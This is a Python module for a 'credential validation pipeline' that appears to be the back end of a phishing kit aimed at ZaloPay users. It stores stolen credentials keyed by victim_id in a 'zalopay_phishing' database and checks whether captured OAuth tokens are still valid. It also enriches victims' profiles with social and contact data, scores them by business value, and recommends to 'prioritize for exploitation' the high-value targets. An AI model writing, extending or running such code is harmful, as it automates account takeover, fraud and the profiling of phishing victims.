"""
Credential Validation Pipeline
Automated credential validation with business intelligence and market classification
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Union
import logging
from enum import Enum
import hashlib
import secrets

from engines.validation.business_intelligence import BusinessIntelligenceEngine, BusinessAccount
from engines.validation.market_classifier import MarketClassifier
from engines.validation.oauth_validator import OAuthValidator
from engines.validation.profile_enrichment import ProfileEnrichmentEngine
from engines.validation.fingerprint_analyzer import FingerprintAnalyzer
from security.encryption_manager import get_advanced_encryption_manager

logger = logging.getLogger(__name__)

class ValidationStatus(Enum):
    """Validation status enumeration"""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"
    EXPIRED = "expired"

class ValidationResult(Enum):
    """Validation result enumeration"""
    VALID = "valid"
    INVALID = "invalid"
    SUSPICIOUS = "suspicious"
    UNKNOWN = "unknown"

class CredentialType(Enum):
    """Credential type enumeration"""
    OAUTH_TOKEN = "oauth_token"
    EMAIL_PASSWORD = "email_password"
    SOCIAL_LOGIN = "social_login"
    API_KEY = "api_key"
    SESSION_TOKEN = "session_token"

class ValidationPipeline:
    """Automated credential validation pipeline"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Initialize validation engines
        self.business_intelligence = BusinessIntelligenceEngine(mongodb_connection, redis_client)
        self.market_classifier = MarketClassifier()
        self.oauth_validator = OAuthValidator()
        self.profile_enrichment = ProfileEnrichmentEngine()
        self.fingerprint_analyzer = FingerprintAnalyzer()
        
        # Initialize encryption manager
        self.encryption_manager = get_advanced_encryption_manager()
        
        # Pipeline configuration
        self.config = {
            "max_validation_time": int(os.getenv("MAX_VALIDATION_TIME", "300")),  # 5 minutes
            "enable_business_intelligence": os.getenv("ENABLE_BI_VALIDATION", "true").lower() == "true",
            "enable_market_classification": os.getenv("ENABLE_MARKET_CLASSIFICATION", "true").lower() == "true",
            "enable_oauth_validation": os.getenv("ENABLE_OAUTH_VALIDATION", "true").lower() == "true",
            "enable_profile_enrichment": os.getenv("ENABLE_PROFILE_ENRICHMENT", "true").lower() == "true",
            "enable_fingerprint_analysis": os.getenv("ENABLE_FINGERPRINT_ANALYSIS", "true").lower() == "true",
            "validation_timeout": int(os.getenv("VALIDATION_TIMEOUT", "30")),  # 30 seconds per step
            "retry_attempts": int(os.getenv("VALIDATION_RETRY_ATTEMPTS", "3")),
            "cache_duration": int(os.getenv("VALIDATION_CACHE_DURATION", "3600"))  # 1 hour
        }
        
        # Validation queue and results
        self.validation_queue = []
        self.validation_results = {}
        self.active_validations = {}
        
        logger.info("Credential validation pipeline initialized")
    
    async def validate_credential(self, credential_data: Dict[str, Any], 
                                victim_id: str = None, 
                                session_id: str = None) -> Dict[str, Any]:
        """
        Validate credential through automated pipeline
        
        Args:
            credential_data: Credential data to validate
            victim_id: Victim identifier
            session_id: Session identifier
            
        Returns:
            Validation result with analysis
        """
        try:
            # Generate validation ID
            validation_id = secrets.token_hex(16)
            
            # Create validation record
            validation_record = {
                "validation_id": validation_id,
                "victim_id": victim_id,
                "session_id": session_id,
                "credential_data": credential_data,
                "status": ValidationStatus.PENDING.value,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "started_at": None,
                "completed_at": None,
                "results": {},
                "errors": [],
                "confidence_score": 0.0,
                "risk_score": 0.0,
                "business_value_score": 0.0,
                "market_classification": None,
                "recommendations": []
            }
            
            # Store validation record
            await self._store_validation_record(validation_record)
            
            # Start validation process
            validation_result = await self._execute_validation_pipeline(validation_record)
            
            # Update validation record
            validation_record.update(validation_result)
            validation_record["status"] = ValidationStatus.COMPLETED.value
            validation_record["completed_at"] = datetime.now(timezone.utc).isoformat()
            
            # Store final result
            await self._store_validation_record(validation_record)
            
            logger.info(f"Credential validation completed: {validation_id}")
            return validation_record
            
        except Exception as e:
            logger.error(f"Error in credential validation: {e}")
            return {
                "validation_id": validation_id if 'validation_id' in locals() else None,
                "status": ValidationStatus.FAILED.value,
                "error": str(e),
                "created_at": datetime.now(timezone.utc).isoformat()
            }
    
    async def _execute_validation_pipeline(self, validation_record: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the validation pipeline"""
        try:
            validation_id = validation_record["validation_id"]
            credential_data = validation_record["credential_data"]
            
            # Mark as in progress
            validation_record["status"] = ValidationStatus.IN_PROGRESS.value
            validation_record["started_at"] = datetime.now(timezone.utc).isoformat()
            
            results = {}
            errors = []
            confidence_scores = []
            risk_scores = []
            
            # Step 1: Business Intelligence Analysis
            if self.config["enable_business_intelligence"]:
                try:
                    bi_result = await self._run_business_intelligence_analysis(credential_data)
                    results["business_intelligence"] = bi_result
                    confidence_scores.append(bi_result.get("confidence_score", 0.0))
                    risk_scores.append(bi_result.get("risk_score", 0.0))
                except Exception as e:
                    error_msg = f"Business intelligence analysis failed: {str(e)}"
                    errors.append(error_msg)
                    logger.error(error_msg)
            
            # Step 2: Market Classification
            if self.config["enable_market_classification"]:
                try:
                    market_result = await self._run_market_classification(credential_data)
                    results["market_classification"] = market_result
                    confidence_scores.append(market_result.get("confidence_score", 0.0))
                except Exception as e:
                    error_msg = f"Market classification failed: {str(e)}"
                    errors.append(error_msg)
                    logger.error(error_msg)
            
            # Step 3: OAuth Validation
            if self.config["enable_oauth_validation"]:
                try:
                    oauth_result = await self._run_oauth_validation(credential_data)
                    results["oauth_validation"] = oauth_result
                    confidence_scores.append(oauth_result.get("confidence_score", 0.0))
                    risk_scores.append(oauth_result.get("risk_score", 0.0))
                except Exception as e:
                    error_msg = f"OAuth validation failed: {str(e)}"
                    errors.append(error_msg)
                    logger.error(error_msg)
            
            # Step 4: Profile Enrichment
            if self.config["enable_profile_enrichment"]:
                try:
                    profile_result = await self._run_profile_enrichment(credential_data)
                    results["profile_enrichment"] = profile_result
                    confidence_scores.append(profile_result.get("confidence_score", 0.0))
                except Exception as e:
                    error_msg = f"Profile enrichment failed: {str(e)}"
                    errors.append(error_msg)
                    logger.error(error_msg)
            
            # Step 5: Fingerprint Analysis
            if self.config["enable_fingerprint_analysis"]:
                try:
                    fingerprint_result = await self._run_fingerprint_analysis(credential_data)
                    results["fingerprint_analysis"] = fingerprint_result
                    confidence_scores.append(fingerprint_result.get("confidence_score", 0.0))
                    risk_scores.append(fingerprint_result.get("risk_score", 0.0))
                except Exception as e:
                    error_msg = f"Fingerprint analysis failed: {str(e)}"
                    errors.append(error_msg)
                    logger.error(error_msg)
            
            # Calculate overall scores
            overall_confidence = sum(confidence_scores) / len(confidence_scores) if confidence_scores else 0.0
            overall_risk = sum(risk_scores) / len(risk_scores) if risk_scores else 0.0
            
            # Determine validation result
            validation_result = self._determine_validation_result(results, overall_confidence, overall_risk)
            
            # Generate recommendations
            recommendations = self._generate_recommendations(results, validation_result)
            
            return {
                "results": results,
                "errors": errors,
                "confidence_score": overall_confidence,
                "risk_score": overall_risk,
                "validation_result": validation_result,
                "recommendations": recommendations,
                "business_value_score": results.get("business_intelligence", {}).get("business_value_score", 0.0),
                "market_classification": results.get("market_classification", {}).get("classification", "unknown")
            }
            
        except Exception as e:
            logger.error(f"Error executing validation pipeline: {e}")
            return {
                "results": {},
                "errors": [str(e)],
                "confidence_score": 0.0,
                "risk_score": 1.0,
                "validation_result": ValidationResult.UNKNOWN.value,
                "recommendations": ["Manual review required due to validation errors"]
            }
    
    async def _run_business_intelligence_analysis(self, credential_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run business intelligence analysis"""
        try:
            email = credential_data.get("email")
            domain = credential_data.get("domain")
            
            if not email:
                return {"error": "No email provided for business intelligence analysis"}
            
            # Analyze business account
            business_account = self.business_intelligence.analyze_business_account(
                email=email,
                domain=domain,
                additional_data=credential_data
            )
            
            return {
                "business_value_score": business_account.business_value_score,
                "opportunity_score": business_account.opportunity_score,
                "market_position": business_account.market_position,
                "industry": business_account.industry,
                "company_size": business_account.employee_count,
                "risk_factors": business_account.risk_factors,
                "confidence_score": business_account.confidence_level,
                "risk_score": len(business_account.risk_factors) / 10.0,  # Normalize risk factors
                "intelligence_sources": business_account.intelligence_sources
            }
            
        except Exception as e:
            logger.error(f"Business intelligence analysis error: {e}")
            return {"error": str(e), "confidence_score": 0.0, "risk_score": 0.5}
    
    async def _run_market_classification(self, credential_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run market classification"""
        try:
            email = credential_data.get("email")
            domain = credential_data.get("domain")
            
            if not email:
                return {"error": "No email provided for market classification"}
            
            # Classify market segment
            classification = self.market_classifier.classify_account(
                email=email,
                domain=domain,
                additional_data=credential_data
            )
            
            return {
                "classification": classification.get("market_segment", "unknown"),
                "confidence_score": classification.get("confidence", 0.0),
                "market_value": classification.get("market_value", 0.0),
                "targeting_score": classification.get("targeting_score", 0.0),
                "demographics": classification.get("demographics", {}),
                "behavioral_patterns": classification.get("behavioral_patterns", [])
            }
            
        except Exception as e:
            logger.error(f"Market classification error: {e}")
            return {"error": str(e), "confidence_score": 0.0}
    
    async def _run_oauth_validation(self, credential_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run OAuth validation"""
        try:
            provider = credential_data.get("provider")
            access_token = credential_data.get("access_token")
            id_token = credential_data.get("id_token")
            
            if not provider or (not access_token and not id_token):
                return {"error": "No OAuth provider or token provided"}
            
            # Validate OAuth token
            validation_result = await self.oauth_validator.validate_token(
                provider=provider,
                access_token=access_token,
                id_token=id_token
            )
            
            return {
                "is_valid": validation_result.get("is_valid", False),
                "token_type": validation_result.get("token_type", "unknown"),
                "expires_at": validation_result.get("expires_at"),
                "scopes": validation_result.get("scopes", []),
                "user_info": validation_result.get("user_info", {}),
                "confidence_score": validation_result.get("confidence_score", 0.0),
                "risk_score": 0.0 if validation_result.get("is_valid", False) else 0.8,
                "validation_details": validation_result.get("details", {})
            }
            
        except Exception as e:
            logger.error(f"OAuth validation error: {e}")
            return {"error": str(e), "confidence_score": 0.0, "risk_score": 0.5}
    
    async def _run_profile_enrichment(self, credential_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run profile enrichment"""
        try:
            email = credential_data.get("email")
            user_info = credential_data.get("user_info", {})
            
            if not email:
                return {"error": "No email provided for profile enrichment"}
            
            # Enrich profile
            enriched_profile = await self.profile_enrichment.enrich_profile(
                email=email,
                user_info=user_info,
                additional_data=credential_data
            )
            
            return {
                "enriched_data": enriched_profile.get("enriched_data", {}),
                "data_sources": enriched_profile.get("data_sources", []),
                "completeness_score": enriched_profile.get("completeness_score", 0.0),
                "confidence_score": enriched_profile.get("confidence_score", 0.0),
                "social_profiles": enriched_profile.get("social_profiles", {}),
                "contact_info": enriched_profile.get("contact_info", {}),
                "professional_info": enriched_profile.get("professional_info", {})
            }
            
        except Exception as e:
            logger.error(f"Profile enrichment error: {e}")
            return {"error": str(e), "confidence_score": 0.0}
    
    async def _run_fingerprint_analysis(self, credential_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run fingerprint analysis"""
        try:
            fingerprint_data = credential_data.get("fingerprint_data")
            
            if not fingerprint_data:
                return {"error": "No fingerprint data provided"}
            
            # Analyze fingerprint
            analysis_result = self.fingerprint_analyzer.analyze_fingerprint(fingerprint_data)
            
            return {
                "device_detection": analysis_result.get("device_detection", {}),
                "vietnamese_profile_match": analysis_result.get("vietnamese_profile_match", {}),
                "risk_assessment": analysis_result.get("risk_assessment", {}),
                "consistency_check": analysis_result.get("consistency_check", {}),
                "behavioral_analysis": analysis_result.get("behavioral_analysis", {}),
                "confidence_score": analysis_result.get("confidence_score", 0.0),
                "risk_score": analysis_result.get("risk_assessment", {}).get("risk_score", 0.0),
                "bot_probability": analysis_result.get("bot_probability", 0.0)
            }
            
        except Exception as e:
            logger.error(f"Fingerprint analysis error: {e}")
            return {"error": str(e), "confidence_score": 0.0, "risk_score": 0.5}
    
    def _determine_validation_result(self, results: Dict[str, Any], 
                                   confidence_score: float, risk_score: float) -> str:
        """Determine overall validation result"""
        try:
            # Check for critical errors
            critical_errors = 0
            for result in results.values():
                if isinstance(result, dict) and "error" in result:
                    critical_errors += 1
            
            # High error rate indicates suspicious activity
            if critical_errors >= len(results) / 2:
                return ValidationResult.SUSPICIOUS.value
            
            # Check OAuth validation result
            oauth_result = results.get("oauth_validation", {})
            if oauth_result.get("is_valid") is False:
                return ValidationResult.INVALID.value
            
            # Check risk score
            if risk_score > 0.7:
                return ValidationResult.SUSPICIOUS.value
            
            # Check confidence score
            if confidence_score < 0.3:
                return ValidationResult.UNKNOWN.value
            
            # Check fingerprint analysis
            fingerprint_result = results.get("fingerprint_analysis", {})
            bot_probability = fingerprint_result.get("bot_probability", 0.0)
            if bot_probability > 0.8:
                return ValidationResult.SUSPICIOUS.value
            
            # Check business intelligence
            bi_result = results.get("business_intelligence", {})
            business_value = bi_result.get("business_value_score", 0.0)
            if business_value > 0.7 and confidence_score > 0.6:
                return ValidationResult.VALID.value
            
            # Default to valid if no major issues
            if confidence_score > 0.5 and risk_score < 0.5:
                return ValidationResult.VALID.value
            
            return ValidationResult.UNKNOWN.value
            
        except Exception as e:
            logger.error(f"Error determining validation result: {e}")
            return ValidationResult.UNKNOWN.value
    
    def _generate_recommendations(self, results: Dict[str, Any], validation_result: str) -> List[str]:
        """Generate recommendations based on validation results"""
        recommendations = []
        
        try:
            # Validation result based recommendations
            if validation_result == ValidationResult.INVALID.value:
                recommendations.append("Credential appears invalid - investigate further")
            elif validation_result == ValidationResult.SUSPICIOUS.value:
                recommendations.append("Suspicious activity detected - implement additional verification")
            elif validation_result == ValidationResult.UNKNOWN.value:
                recommendations.append("Insufficient data for validation - manual review recommended")
            
            # Business intelligence recommendations
            bi_result = results.get("business_intelligence", {})
            business_value = bi_result.get("business_value_score", 0.0)
            if business_value > 0.8:
                recommendations.append("High-value business target - prioritize for exploitation")
            elif business_value < 0.3:
                recommendations.append("Low-value target - consider deprioritizing")
            
            # Risk factor recommendations
            risk_factors = bi_result.get("risk_factors", [])
            if risk_factors:
                recommendations.append(f"Risk factors identified: {', '.join(risk_factors[:3])}")
            
            # Market classification recommendations
            market_result = results.get("market_classification", {})
            market_segment = market_result.get("classification", "unknown")
            if market_segment != "unknown":
                recommendations.append(f"Target market segment: {market_segment}")
            
            # Fingerprint recommendations
            fingerprint_result = results.get("fingerprint_analysis", {})
            bot_probability = fingerprint_result.get("bot_probability", 0.0)
            if bot_probability > 0.5:
                recommendations.append("High bot probability - implement CAPTCHA or additional verification")
            
            # OAuth recommendations
            oauth_result = results.get("oauth_validation", {})
            if not oauth_result.get("is_valid", True):
                recommendations.append("OAuth token validation failed - check token validity")
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error generating recommendations: {e}")
            return ["Manual review recommended due to analysis errors"]
    
    async def _store_validation_record(self, validation_record: Dict[str, Any]):
        """Store validation record in database"""
        try:
            if not self.mongodb:
                return
            
            db = self.mongodb.get_database("zalopay_phishing")
            validations_collection = db.credential_validations
            
            # Encrypt sensitive data
            encrypted_data = self.encryption_manager.encrypt_data(
                validation_record["credential_data"],
                data_type="credential_validation",
                associated_data=validation_record["validation_id"]
            )
            
            # Create document
            document = {
                "validation_id": validation_record["validation_id"],
                "victim_id": validation_record.get("victim_id"),
                "session_id": validation_record.get("session_id"),
                "encrypted_credential_data": encrypted_data,
                "status": validation_record["status"],
                "created_at": validation_record["created_at"],
                "started_at": validation_record.get("started_at"),
                "completed_at": validation_record.get("completed_at"),
                "results": validation_record.get("results", {}),
                "errors": validation_record.get("errors", []),
                "confidence_score": validation_record.get("confidence_score", 0.0),
                "risk_score": validation_record.get("risk_score", 0.0),
                "business_value_score": validation_record.get("business_value_score", 0.0),
                "market_classification": validation_record.get("market_classification"),
                "validation_result": validation_record.get("validation_result"),
                "recommendations": validation_record.get("recommendations", []),
                "expires_at": datetime.now(timezone.utc) + timedelta(days=30)
            }
            
            validations_collection.replace_one(
                {"validation_id": validation_record["validation_id"]},
                document,
                upsert=True
            )
            
        except Exception as e:
            logger.error(f"Error storing validation record: {e}")
    
    async def get_validation_result(self, validation_id: str) -> Optional[Dict[str, Any]]:
        """Get validation result by ID"""
        try:
            if not self.mongodb:
                return None
            
            db = self.mongodb.get_database("zalopay_phishing")
            validations_collection = db.credential_validations
            
            document = validations_collection.find_one({"validation_id": validation_id})
            if not document:
                return None
            
            # Decrypt credential data
            try:
                decrypted_data = self.encryption_manager.decrypt_data(
                    document["encrypted_credential_data"],
                    associated_data=validation_id
                )
                document["credential_data"] = decrypted_data
            except Exception as e:
                logger.error(f"Error decrypting credential data: {e}")
                document["credential_data"] = None
            
            # Remove encrypted data
            document.pop("encrypted_credential_data", None)
            document.pop("_id", None)
            
            return document
            
        except Exception as e:
            logger.error(f"Error getting validation result: {e}")
            return None
    
    async def batch_validate_credentials(self, credentials_list: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Batch validate multiple credentials"""
        try:
            validation_tasks = []
            
            for credential_data in credentials_list:
                task = self.validate_credential(credential_data)
                validation_tasks.append(task)
            
            # Execute all validations concurrently
            results = await asyncio.gather(*validation_tasks, return_exceptions=True)
            
            # Process results
            processed_results = []
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    processed_results.append({
                        "error": str(result),
                        "credential_index": i,
                        "status": ValidationStatus.FAILED.value
                    })
                else:
                    processed_results.append(result)
            
            logger.info(f"Batch validation completed: {len(processed_results)} credentials")
            return processed_results
            
        except Exception as e:
            logger.error(f"Error in batch validation: {e}")
            return []
    
    def get_pipeline_stats(self) -> Dict[str, Any]:
        """Get validation pipeline statistics"""
        try:
            stats = {
                "active_validations": len(self.active_validations),
                "queued_validations": len(self.validation_queue),
                "completed_validations": len(self.validation_results),
                "configuration": self.config,
                "engines_status": {
                    "business_intelligence": self.config["enable_business_intelligence"],
                    "market_classification": self.config["enable_market_classification"],
                    "oauth_validation": self.config["enable_oauth_validation"],
                    "profile_enrichment": self.config["enable_profile_enrichment"],
                    "fingerprint_analysis": self.config["enable_fingerprint_analysis"]
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return stats
            
        except Exception as e:
            logger.error(f"Error getting pipeline stats: {e}")
            return {"error": str(e)}

# Global validation pipeline instance
validation_pipeline = None

def initialize_validation_pipeline(mongodb_connection=None, redis_client=None) -> ValidationPipeline:
    """Initialize global validation pipeline"""
    global validation_pipeline
    validation_pipeline = ValidationPipeline(mongodb_connection, redis_client)
    return validation_pipeline

def get_validation_pipeline() -> ValidationPipeline:
    """Get global validation pipeline"""
    if validation_pipeline is None:
        raise ValueError("Validation pipeline not initialized")
    return validation_pipeline

# Convenience functions
def validate_credential(credential_data: Dict[str, Any], victim_id: str = None, session_id: str = None) -> Dict[str, Any]:
    """Validate credential (global convenience function)"""
    return get_validation_pipeline().validate_credential(credential_data, victim_id, session_id)

def get_validation_result(validation_id: str) -> Optional[Dict[str, Any]]:
    """Get validation result (global convenience function)"""
    return get_validation_pipeline().get_validation_result(validation_id)

def batch_validate_credentials(credentials_list: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Batch validate credentials (global convenience function)"""
    return get_validation_pipeline().batch_validate_credentials(credentials_list)
